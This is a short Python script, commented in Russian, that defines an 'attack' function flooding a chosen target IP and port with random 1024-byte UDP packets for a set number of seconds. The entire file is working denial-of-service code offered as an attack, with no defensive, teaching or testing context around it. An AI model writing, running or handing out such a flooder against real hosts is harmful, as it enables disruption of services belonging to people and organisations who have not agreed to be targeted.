import socket
import random
import time
import threading

def attack(target, port=80, duration=60):
    """Простой UDP флуд"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1024)
    end = time.time() + duration
    while time.time() < end:
        try:
            sock.sendto(payload, (target, port))
        except:
            pass
